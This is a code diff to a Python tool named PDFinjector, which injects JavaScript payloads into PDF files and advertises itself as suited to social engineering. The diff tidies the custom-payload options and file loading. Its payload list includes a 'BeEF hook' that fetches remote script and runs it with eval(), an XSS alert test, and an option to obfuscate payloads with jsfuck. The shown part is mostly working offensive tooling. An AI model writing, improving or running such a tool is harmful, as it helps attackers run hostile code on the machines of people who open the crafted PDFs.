@@ -1,16 +1,14 @@
-#TODO: ADD BANNER AND LOGO
-#https://pypdf.readthedocs.io/en/stable/user/add-javascript.html
-
 from pypdf import PdfWriter, PdfReader
 import argparse, execjs, re
 
 
 parser = argparse.ArgumentParser(description="PDFinjector can insert javascript code in pdf files, perfect for social engineering.")
 
+cporcfp = parser.add_mutually_exclusive_group()
 parser.add_argument("-f", "--file", type=str, help="the input file", required=True)
 parser.add_argument("-o", "--output", type=str, help="the output file, if not set it will overwrite the input file")
-parser.add_argument("-cp", "--custompayload", type=str, help="the custom payload to inject, via text")
-parser.add_argument("-cfp", "--customfilepayload", type=str, help="the custompayload to inject, via file.js")
+cporcfp.add_argument("-cp", "--custompayload", type=str, help="the custom payload to inject, via text")
+cporcfp.add_argument("-cfp", "--customfilepayload", type=str, help="the custompayload to inject, via file.js")
 parser.add_argument("-ob", "--obfuscate", action="store_true", help="obfuscate the code using jsfuck")
 
 args = parser.parse_args()
@@ -32,8 +30,6 @@ payloads = [
     .then(response => response.text())
     .then(script => eval(script))
     .catch(error => console.error('Error loading script:', error));""", "the BeEF hook",
-    
-    ####tests
     
     "<script>alert('XSS!');</script>", "Basic XSS test",
 
@@ -101,7 +97,11 @@ def main():
     if args.custompayload:
         payload = args.custompayload
     elif args.customfilepayload:
-        payload = args.customfilepayload
+        try:
+            with open(args.customfilepayload, 'r') as f:
+                payload = f.read()
+        except Exception as e:
+            print(f"Error with opening the file: {e}")
     else:
         print("-"*40)
         try:
